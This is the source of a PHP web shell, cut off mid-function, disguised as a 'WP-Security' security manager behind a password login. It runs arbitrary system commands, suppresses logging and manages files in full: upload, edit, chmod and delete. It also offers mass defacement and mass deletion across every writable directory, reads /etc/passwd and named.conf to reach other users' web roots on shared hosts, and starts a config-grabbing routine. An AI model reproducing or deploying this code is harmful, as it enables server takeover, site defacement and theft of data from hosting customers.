<?php

session_start();
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

/* Configurasi */
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
date_default_timezone_set('Asia/Jakarta');
function login_shell() {
    ?>
<!DOCTYPE html>
<html>
    <head>
        <meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
        <meta name="author" content="MarkJustKiding"/>
        <meta name="copyright" content="WP-Security"/>
        <title>WP-Security</title>
        <link rel="icon" type="image/png" href="https://i.pinimg.com/736x/d1/6e/65/d16e656b8d40f345d574cf3485ffeb00.jpg"/>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"/>
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
        <meta name="theme-color" content="#7952b3">
        <link href="https://getbootstrap.com/docs/5.0/examples/sign-in/signin.css" rel="stylesheet">
    </head>
    <body>
        <main class="form-signin text-center">
            <form method="post">
                <img class="mb-4 bd-placeholder-img" src="https://i.pinimg.com/736x/d1/6e/65/d16e656b8d40f345d574cf3485ffeb00.jpg" alt="" width="72" height="65">
                <h1 class="h3 mb-3 fw-normal">Security Manager</h1>
                <div class="form-floating">
                    <input type="password" class="form-control" id="floatingPassword" placeholder="User ID" name="pass">
                    <label for="floatingPassword">Password</label>
                </div>
                <button class="w-100 btn btn-lg btn-primary" type="submit" value="Login">Sign in</button>
                <p class="mt-5 mb-3 text-muted">WP-Security © 2017–<?= date("Y") ?></p>
            </form>
        </main>
    </body>
</html>
<?php
exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == '8f9a91e680301cea464b2419b1f5f87a')) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}
/*
    * Akhir Login
    *
    * Aksi Download
*/
if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: '.filesize($file));
    readfile($file);
    exit;
}
function w($dir, $perm) {
    if (!is_writable($dir)) {
        return "<font color='red'>".$perm.'</font>';
    } else {
        return "<font color='lime'>".$perm.'</font>';
    }
}
function r($dir, $perm) {
    if (!is_readable($dir)) {
        return '<font color=red>'.$perm.'</font>';
    } else {
        return '<font color=lime>'.$perm.'</font>';
    }
}

function exe($cmd) {
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();

        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = '';
        foreach ($results as $result) {
            $buff .= $result;
        }

        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();

        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);

        return $buff;
    }
}
function perms($file) {
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x') :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x') :
    (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x') :
    (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

if (isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    chdir($dir);
} else {
    $dir = getcwd();
}

$os = php_uname();
$ip = gethostbyname(gethostname());
$ver = phpversion();
$web = $_SERVER['HTTP_HOST'];
$sof = $_SERVER['SERVER_SOFTWARE'];
$dir = str_replace('\\', '/', $dir);
$scdir = explode('/', $dir);
$mysql = (function_exists('mysqli_connect')) ? '<font color=green>ON</font>' : '<font color=red>OFF</font>';
$curl = (function_exists('curl_version')) ? '<font color=green>ON</font>' : '<font color=red>OFF</font>';
$mail = (function_exists('mail')) ? '<font color=green>ON</font>' : '<font color=red>OFF</font>';
$total = disk_total_space($dir);
$free = disk_free_space($dir);
$pers = (int) ($free / $total * 100);
$ds = @ini_get('disable_functions');
$show_ds = (!empty($ds)) ? "<a href='?dir=$dir&aksi=disabfunc' class='ds'>$ds</a>" : "<a href='?dir=$dir&aksi=disabfunc'><font color=green>NONE</font></a>";
$imgfol = "<img src='http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png' class='ico'></img>";
$imgfile = "<img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img>";
function formatSize($bytes) {
    $types = ['B', 'KB', 'MB', 'GB', 'TB'];
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);

    return round($bytes, 2).' '.$types[$i];
}
function ambilKata($param, $kata1, $kata2) {
    if (strpos($param, $kata1) === false) {
        return false;
    }
    if (strpos($param, $kata2) === false) {
        return false;
    }
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);

    return $return;
}
$d0mains = @file('/etc/named.conf', false);
if (!$d0mains) {
    $dom = '<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>';
    $GLOBALS['need_to_update_header'] = 'true';
} else {
    $count = 0;
    foreach ($d0mains as $d0main) {
        if (@strstr($d0main, 'zone')) {
            preg_match_all('#zone "(.*)"#', $d0main, $domains);
            flush();
            if (strlen(trim($domains[1][0])) > 2) {
                flush();
                $count++;
            }
        }
    }
    $dom = "$count Domain";
}

function getsource($url) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    curl_close($curl);

    return $content;
}

function bing($dork) {
    $npage = 1;
    $npages = 30000;
    $allLinks = [];
    $lll = [];
    while ($npage <= $npages) {
        $x = getsource('http://www.bing.com/search?q='.$dork.'&first='.$npage);
        if ($x) {
            preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
            foreach ($findlink[1] as $fl) {
                array_push($allLinks, $fl);
            }
            $npage = $npage + 10;
            if (preg_match('(first='.$npage.'&amp)siU', $x, $linksuiv) == 0) {
                break;
            }
        } else {
            break;
        }
    }
    $URLs = [];
    foreach ($allLinks as $url) {
        $exp = explode('/', $url);
        $URLs[] = $exp[2];
    }
    $array = array_filter($URLs);
    $array = array_unique($array);
    $sss = count(array_unique($array));
    foreach ($array as $domain) {
        echo $domain."\n";
    }
}

function iconFile($ext) {
    if ($ext == 'php') {
        $img = 'https://cdn-icons-png.flaticon.com/128/2656/2656439.png'; //
    } elseif ($ext == 'html') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136528.png'; //
    } elseif ($ext == 'css') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136527.png'; //
    } elseif ($ext == 'png') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136523.png'; //
    } elseif ($ext == 'jpg') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136524.png'; //
    } elseif ($ext == 'jpeg') {
        $img = 'https://cdn-icons-png.flaticon.com/128/2656/2656444.png'; //
    } elseif ($ext == 'zip') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136544.png'; //
    } elseif ($ext == 'js') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136530.png'; //
    } elseif ($ext == 'xml') {
        $img = 'https://cdn-icons-png.flaticon.com/128/2656/2656443.png'; //
    } elseif ($ext == 'ttf') {
        $img = 'https://cdn-icons-png.flaticon.com/128/2656/2656379.png'; //
    } elseif ($ext == 'otf') {
        $img = 'https://cdn-icons-png.flaticon.com/128/1126/1126891.png';
    } elseif ($ext == 'txt') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136538.png'; //
    } elseif ($ext == 'ico') {
        $img = 'https://cdn-icons-png.flaticon.com/128/2656/2656373.png'; //
    } elseif ($ext == 'iso') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136541.png'; //  
    } elseif ($ext == 'bak') {
        $img = 'https://cdn-icons-png.flaticon.com/128/2656/2656400.png'; //  
    } elseif ($ext == 'conf') {
        $img = 'https://cdn-icons-png.flaticon.com//512/1573/1573301.png'; //
    } elseif ($ext == 'htaccess') {
        $img = 'https://cdn-icons-png.flaticon.com/128/1720/1720444.png';
    } elseif ($ext == 'sh') {
        $img = 'https://cdn-icons-png.flaticon.com/128/617/617535.png';
    } elseif ($ext == 'bat') {
        $img = 'https://cdn-icons-png.flaticon.com/128/2656/2656403.png'; //
    } elseif ($ext == 'dat') {
        $img = 'https://cdn-icons-png.flaticon.com/128/2656/2656460.png'; //
    } elseif ($ext == 'py') {
        $img = 'https://cdn-icons-png.flaticon.com/128/180/180867.png';
    } elseif ($ext == 'sql') {
        $img = 'https://cdn-icons-png.flaticon.com/128/2656/2656457.png'; //
    } elseif ($ext == 'pl') {
        $img = 'http://i.imgur.com/PnmX8H9.png';
    } elseif ($ext == 'pdf') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136522.png'; 
    } elseif ($ext == 'mp4') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136545.png'; //
    } elseif ($ext == 'mp3') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136548.png'; //
    } elseif ($ext == 'gif') {
        $img = 'https://cdn-icons-png.flaticon.com/128/2656/2656437.png'; //
    } elseif ($ext == 'git') {
        $img = 'https://cdn-icons-png.flaticon.com/128/617/617509.png';
    } elseif ($ext == 'md') {
        $img = 'https://cdn-icons-png.flaticon.com/128/617/617520.png';
    } elseif ($ext == 'exe') {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136531.png'; //
    } else {
        $img = 'https://cdn-icons-png.flaticon.com/512/136/136549.png';
    }

    return $img;
}

function swall($swa, $text, $dir) {
    echo "<script>Swal.fire({
        title: '$swa',
        text: '$text',
        type: '$swa',
    }).then((value) => {window.location='?dir=$dir';})</script>";
}
function about() {
    echo '<div class="card text-center bg-light about">
        <h4 class="card-header">WP-Security</h4>
        <div class="card-body">
            <center><div class="img"></div></center>
            <p class="card-text">WP-Security Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Sampai Sebuah Inti Sistem.</p>
        </div>
        <div class="card-footer">
            <small class="card-text text-muted">Copyright 2024 WP-Security</small>
        </div>
    </div><br/>';
    exit;
}
function aksiUpload($dir) {
    echo '<form method="POST" enctype="multipart/form-data" name="uploader" id="uploader">
        <div class="card">
            <div class="card-body form-group">
                <p class="text-muted">//Multiple Upload</p>
                <div class="custom-file">
                    <input type="file" name="file[]" multiple class="custom-file-input" id="customFile">
                    <label class="custom-file-label" for="customFile">Choose file</label>
                </div>
                <input type="submit" class="btn btn-sm btn-primary btn-block mt-4 p-2" name="upload" value="Upload">
            </div>
        </div>
    </form>';
    if (isset($_POST['upload'])) {
        $jumlah = count($_FILES['file']['name']);
        for ($i = 0; $i < $jumlah; $i++) {
            $filename = $_FILES['file']['name'][$i];
            $up = @copy($_FILES['file']['tmp_name'][$i], "$dir/".$filename);
        }
        if ($jumlah < 2) {
            if ($up) {
                $swa = 'success';
                $text = "Berhasil Upload $filename";
                swall($swa, $text, $dir);
            } else {
                $swa = 'error';
                $text = 'Gagal Upload File';
                swall($swa, $text, $dir);
            }
        } else {
            $swa = 'success';
            $text = "Berhasil Upload $jumlah File";
            swall($swa, $text, $dir);
        }
    }
}
function chmodFile($dir, $file, $nfile) {
    echo "<form method='POST'>
        <h5>Chmod File : $nfile </h5>
        <div class='form-group input-group'>
            <input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['file'])), -4)."'>
            <input type='submit' class='btn btn-danger form-control' value='Chmod'>
        </div>
    </form>";
    if (isset($_POST['perm'])) {
        if (@chmod($_GET['file'], $_POST['perm'])) {
            echo '<font color="lime">Change Permission Berhasil</font><br/>';
        } else {
            echo '<font color="white">Change Permission Gagal</font><br/>';
        }
    }
}
function buatFile($dir, $imgfile) {
    echo "<h4>$imgfile Buat File :</h4>
    <form method='POST'>
        <div class='input-group'>
            <input type='text' class='form-control' name='nama_file[]' placeholder='Nama File...'>
            <div class='input-group-prepend'>
                <div class='input-group-text'><a id='add_input'><i class='fa fa-plus'></i></a></div>
            </div>
        </div><br/>
        <div id='output'></div>
        <textarea name='isi_file' class='form-control' rows='13' placeholder='Isi File...'></textarea><br/>
        <input type='submit' class='btn btn-info btn-block' name='bikin' value='Buat'>
    </form>";
    if (isset($_POST['bikin'])) {
        $name = $_POST['nama_file'];
        $isi_file = $_POST['isi_file'];
        foreach ($name as $nama_file) {
            $handle = @fopen("$nama_file", 'w');
            if ($isi_file) {
                $buat = @fwrite($handle, $isi_file);
            } else {
                $buat = $handle;
            }
        }
        if ($buat) {
            $swa = 'success';
            $text = 'Berhasil Membuat File';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
            $text = 'Gagal Membuat File';
            swall($swa, $text, $dir);
        }
    }
}
function view($dir, $file, $nfile, $imgfile) {
    echo '[ <a class="active" href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]
    <h5>'.$imgfile.' Lihat File : '.$nfile.'</h5>';
    $is_image = @getimagesize($file);
    if (is_array($is_image)) {
        $source = base64_encode(file_get_contents($file));
        echo '<p>Type: '.$is_image['mime'].' | Size: '.$is_image['0'].' x '.$is_image['1']."</p>
        <img class='img-fluid' src='data:".$is_image['mime'].';base64,'.$source."' alt='$nfile'>";
    } else {
        echo '<textarea rows="13" class="form-control" disabled="">'.htmlspecialchars(@file_get_contents($file)).'</textarea><br/>';
    }
}
function editFile($dir, $file, $nfile, $imgfile) {
    echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
    $is_image = @getimagesize($file);
    echo "<form method='POST'>
        <h5>$imgfile Edit File : $nfile</h5>";
        if (is_array($is_image)) {
            echo '<h5>Tidak dapat mengedit gambar</h5>';
        } else {
            echo "<textarea rows='13' class='form-control' name='isi'>".htmlspecialchars(@file_get_contents($file))."</textarea><br/>
            <button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Update</button>";
        }
    echo '</form>';
    if (isset($_POST['edit_file'])) {
        $updt = fopen("$file", 'w');
        $hasil = fwrite($updt, $_POST['isi']);
        if ($hasil) {
            $swa = 'success';
            $text = 'Berhasil Update File';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
            $text = 'Gagal Update File';
            swall($swa, $text, $dir);
        }
    }
}
function renameFile($dir, $file, $nfile, $imgfile) {
    echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
    echo "<form method='POST'>
        <h5>$imgfile Rename File : $nfile</h5>
        <input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...' value='$nfile'><br/>
        <button type='sumbit' class='btn btn-info btn-block' name='rename_file'>Rename</button>
    </form>";
    if (isset($_POST['rename_file'])) {
        $lama = $file;
        $baru = $_POST['namanew'];
        rename($baru, $lama);
        if (file_exists($baru)) {
            $swa = 'success';
            $text = "Nama $baru Telah Digunakan";
            swall($swa, $text, $dir);
        } else {
            if (rename($lama, $baru)) {
                $swa = 'success';
                $text = "Berhasil Mengganti Nama Menjadi $baru";
                swall($swa, $text, $dir);
            } else {
                $swa = 'error';
                $text = 'Gagal Mengganti Nama';
                swall($swa, $text, $dir);
            }
        }
    }
}
function hapusFile($dir, $file, $nfile) {
    echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
    echo "<div class='card card-body text-center text-dark mb-4'>
        <p>Yakin Menghapus : $nfile</p>
        <form method='POST'>
            <a class='btn btn-danger btn-block' href='?dir=$dir'>Tidak</a>
            <input type='submit' name='ya' class='btn btn-success btn-success btn-block' value='Ya'>
        </form>
    </div>";
    if ($_POST['ya']) {
        if (unlink($file)) {
            $swa = 'success';
            $text = 'Berhasil Menghapus File';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
            $text = 'Gagal Menghapus File';
            swall($swa, $text, $dir);
        }
    }
}
function chmodFolder($dir, $ndir) {
    echo "<form method='POST'>
        <h5>Chmod Folder : $ndir </h5>
        <div class='form-group input-group'>
            <input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['dir'])), -4)."'>
            <input type='submit' class='btn btn-danger form-control' value='Chmod' name='chmo'>
        </div>
    </form>";
    if (isset($_POST['chmo'])) {
        if (@chmod($dir.'/'.$ndir, $_POST['perm'])) {
            echo '<font color="lime">Change Permission Berhasil</font><br/>';
        } else {
            echo '<font color="white">Change Permission Gagal</font><br/>';
        }
    }
}
function buatFolder($dir, $imgfol) {
    echo "<h5>$imgfol Buat Folder :</h5>
    <form method='POST'>
        <div class='input-group'>
            <input type='text' class='form-control' name='nama_folder[]' placeholder='Nama Folder...'>
            <div class='input-group-prepend'>
                <div class='input-group-text'><a id='add_input1'><i class='fa fa-plus'></i></a></div>
            </div>
        </div><br/>
        <div id='output1'></div>
        <input type='submit' class='btn btn-info btn-block' name='buat' value='Buat'>
    </form>";
    if (isset($_POST['buat'])) {
        $nama = $_POST['nama_folder'];
        foreach ($nama as $nama_folder) {
            $folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $nama_folder);
            $fd = @mkdir($folder);
        }
        if ($fd) {
            $swa = 'success';
            $text = 'Berhasil Membuat Folder';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
            $text = 'Gagal Membuat Folder';
            swall($swa, $text, $dir);
        }
    }
}
function renameFolder($dir, $ndir, $imgfol) {
    $target = $dir.'/'.$ndir;
    echo "[ <a href='?dir=$dir&target=$ndir&aksi=rename_folder' class='active'>Rename</a> ]  [ <a href='?dir=$dir&target=$ndir&aksi=hapus_folder'>Delete</a> ]
    <h5>$imgfol Rename Folder : $ndir </h5>
    <form method='POST'>
        <input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...' value='$ndir'><br/>
        <button type='sumbit' class='btn btn-info btn-block' name='ganti'>Ganti!!</button><br/>
    </form>";
    if (isset($_POST['ganti'])) {
        $baru = htmlspecialchars($_POST['namanew']);
        $ubah = rename($target, ''.$dir.'/'.$baru.'');
        if ($ubah) {
            $swa = 'success';
            $text = 'Berhasil Mengganti Nama';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
            $text = 'Gagal Mengganti Nama';
            swall($swa, $text, $dir);
        }
    }
}
function deleteFolder($dir, $ndir) {
    $target = $dir.'/'.$ndir;
    echo "[ <a href='?dir=$dir&target=$ndir&aksi=rename_folder'>Rename</a> ]  [ <a href='?dir=$dir&target=$ndir&aksi=hapus_folder' class='active'>Delete</a> ]
    <div class='card card-body text-center text-dark mb-2'>
        <p>Apakah Yakin Menghapus : $ndir ?</p>
        <form method='POST'>
            <a class='btn btn-danger btn-block' href='?dir=".dirname($dir)."'>Tidak</a>
            <input type='submit' name='ya' class='btn btn-success btn-block' value='Ya'>
        </form>
    </div><br/>";
    if ($_POST['ya']) {
        if (is_dir($target)) {
            if (is_writable($target)) {
                @rmdir($target);
                @exe("rm -rf $target");
                @exe("rmdir /s /q $target");
                $swa = 'success';
                $text = 'Berhasil Menghapus';
                swall($swa, $text, $dir);
            } else {
                $swa = 'error';
                $text = 'Berhasil Menghapus';
                swall($swa, $text, $dir);
            }
        }
    }
}
function aksiMasdef($dir, $file, $imgfol, $imgfile) {
    function tipe_massal($dir, $namafile, $isi_script) {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if ($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif ($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            echo "Done > $lokasi\n";
                            file_put_contents($lokasi, $isi_script);
                            $masdef = tipe_massal($dirc, $namafile, $isi_script);
                        }
                    }
                }
            }
        }
    }
    function tipe_biasa($dir, $namafile, $isi_script) {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if ($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif ($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            echo "Done > $dirb/$namafile\n";
                            file_put_contents($lokasi, $isi_script);
                        }
                    }
                }
            }
        }
    }

    if ($_POST['start']) {
        echo "[ <a href='?dir=$dir'>Kembali</a> ]
        <textarea class='form-control' rows='13' disabled=''>";
        if ($_POST['tipe'] == 'mahal') {
            tipe_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
        } elseif ($_POST['tipe'] == 'murah') {
            tipe_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
        }
        echo '</textarea><br/>';
    } else {
        echo "<form method='post'>
            <div class='text-center'>
                <h5>Tipe :</h5>
                <input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
                <label for='toggle-on' class='butn'>Biasa</label>
                <input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
                <label for='toggle-off' class='butn'>Masal</label>
            </div> 
            <h5>$imgfol Lokasi :</h5>
            <input type='text' name='d_dir' value='$dir' class='form-control'><br>
            <h5>$imgfile Nama File :</h5>
            <input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
            <h5>$imgfile Isi File :</h5>
            <textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { IndoSec }'></textarea><br/>
            <input type='submit' name='start' value='Mass Deface' class='btn btn-danger btn-block'>
        </form>";
    }
    exit;
}
function aksiMasdel($dir, $file, $imgfol, $imgfile) {
    function hapus_massal($dir, $namafile) {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if ($dirb === '.') {
                    if (file_exists("$dir/$namafile")) {
                        unlink("$dir/$namafile");
                    }
                } elseif ($dirb === '..') {
                    if (file_exists(''.dirname($dir)."/$namafile")) {
                        unlink(''.dirname($dir)."/$namafile");
                    }
                } else {
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            if ($lokasi) {
                                echo "$lokasi > Terhapus\n";
                                unlink($lokasi);
                                $massdel = hapus_massal($dirc, $namafile);
                            }
                        }
                    }
                }
            }
        }
    }
    if ($_POST['start']) {
        echo "[ <a href='?dir=$dir'>Kembali</a> ]
        <textarea class='form-control' rows='13' disabled=''>";
        hapus_massal($_POST['d_dir'], $_POST['d_file']);
        echo '</textarea><br/>';
    } else {
        echo "<form method='post'>
            <h5>$imgfol Lokasi :</h5>
            <input type='text' name='d_dir' value='$dir' class='form-control'><br/>
            <h5>$imgfile Nama File :</h5>
            <input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
            <input type='submit' name='start' value='Delete!!' class='btn btn-danger form-control'>
    </form>";
    }
    exit;
}
function aksiJump($dir, $file, $ip) {
    $i = 0;
    echo "<div class='card container'>";
    if (preg_match('/hsphere/', $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if (isset($_POST['jump'])) {
            echo '<pre>';
            foreach ($urls as $url) {
                $url = str_replace(['http://', 'www.'], '', strtolower($url));
                $etc = '/etc/passwd';
                $f = fopen($etc, 'r');
                while ($gets = fgets($f)) {
                    $pecah = explode(':', $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if (is_dir($dir_user) === true) {
                        $url_user = $dir_user.'/'.$url;
                        if (is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
                            if (is_writable($url_user)) {
                                $jrw = "[<font color=green>RW</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
                            }
                            echo $jrw.'<br>';
                        }
                    }
                }
            }
            if (!$i == 0) {
                echo "<br>Total ada $i KAMAR di $ip";
            }
            echo '</pre>';
        } else {
            echo '<center><form method="post">
                List Domains: <br>
                <textarea name="url" class="form-control">';
            $fp = fopen('/hsphere/local/config/httpd/sites/sites.txt', 'r');
            while ($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                      <input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
            </form></center>';
        }
    } elseif (preg_match('/vhosts/', $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if (isset($_POST['jump'])) {
            echo '<pre>';
            foreach ($urls as $url) {
                $web_vh = "/var/www/vhosts/$url/httpdocs";
                if (is_dir($web_vh) === true) {
                    if (is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
                        if (is_writable($web_vh)) {
                            $jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
                        }
                        echo $jrw.'<br>';
                    }
                }
            }
            if (!$i == 0) {
                echo "<br>Total ada $i Kamar Di $ip";
            }
            echo '</pre>';
        } else {
            echo '<center><form method="post">
                List Domains: <br>
                <textarea name="url" class="form-control">';
            bing("ip:$ip");
            echo '</textarea><br>
                <input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
            </form></center>';
        }
    } else {
        echo '<pre>';
        $etc = fopen('/etc/passwd', 'r') or die("<font color=red>Can't read /etc/passwd</font><br/>");
        while ($passwd = fgets($etc)) {
            if ($passwd == '' || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font><br/>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach ($user_jumping[1] as $user_pro_jump) {
                    $user_jumping_dir = "/home/$user_pro_jump/public_html";
                    if (is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
                        if (is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if (function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents('/etc/named.conf');
                            if ($domain_jump == '') {
                                echo ' => ( <font color=red>gabisa ambil nama domain nya</font> )<br>';
                            } else {
                                preg_match_all('#/var/named/(.*?).db#', $domain_jump, $domains_jump);
                                foreach ($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if ($user_jumping_url == $user_pro_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo '<br>';
                        }
                    }
                }
            }
        }
        if (!$i == 0) {
            echo "<br>Total ada $i kamar di $ip";
        }
        echo '</pre>';
    }
    echo '</div><br/>';
    exit;
}
function aksiConfig($dir, $file) {
    if ($_POST) {
        $passwd = $_POST['passwd'];
        mkdir('indosec_config', 0777);
